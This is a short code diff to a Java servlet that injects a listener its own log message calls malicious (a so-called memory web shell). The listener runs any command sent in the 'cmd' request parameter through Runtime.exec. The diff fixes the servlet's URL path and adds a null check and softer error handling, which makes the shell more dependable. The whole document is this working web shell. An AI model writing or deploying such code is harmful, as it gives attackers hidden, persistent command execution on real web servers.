@@ -14,7 +14,7 @@ import javax.servlet.http.HttpServletResponse;
 import java.io.IOException;
 import java.lang.reflect.Field;
 
-@WebServlet("/injectLister")
+@WebServlet("/injectListener")
 public class InjectListener extends HttpServlet {
     @Override
     protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
@@ -22,11 +22,15 @@ public class InjectListener extends HttpServlet {
             @Override
             public void requestInitialized(ServletRequestEvent sre) {
                 System.out.println("恶意Listener启动");
-                String cmd = sre.getServletRequest().getParameter("cmd");
                 try {
-                    Runtime.getRuntime().exec(cmd);
+                    String cmd = sre.getServletRequest().getParameter("cmd");
+
+                    if (cmd != null) {
+                        Runtime.getRuntime().exec(cmd);
+                    }
+
                 } catch (IOException e) {
-                    throw new RuntimeException(e);
+                    e.printStackTrace();
                 }
             }
 
